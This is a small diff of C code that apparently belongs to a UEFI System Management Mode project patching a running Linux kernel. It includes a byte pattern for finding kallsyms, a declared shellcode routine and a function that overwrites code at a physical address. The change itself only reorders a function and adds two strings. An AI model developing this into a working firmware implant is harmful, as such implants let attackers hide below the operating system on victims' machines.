@@ -11,10 +11,8 @@ static UINT8 KallsymsPattern[] = { 0x8B, 0x04, 0x25, 0x69, 0x69, 0x69, 0x69, 0x4
 static KallsymsLookupName KallsymsLookUpName = NULL;
 void Shellcode(void);
 
-KallsymsLookupName GetKallsyms()
-{
-  return KallsymsLookUpName;
-}
+unsigned char* print = "_printk";
+unsigned char* printstring = "Zepta";
 
 EFI_STATUS SetupLinux(EFI_SMM_CPU_PROTOCOL* cpu, EFI_SMM_SYSTEM_TABLE2* smst)
 {
@@ -171,4 +169,9 @@ EFI_STATUS PatchRtmFunction(UINT64 phystarget, UINT64 dos)
 
   *(UINT64*)(target + 6) = dos;
 
+}
+
+KallsymsLookupName GetKallsyms()
+{
+  return KallsymsLookUpName;
 }
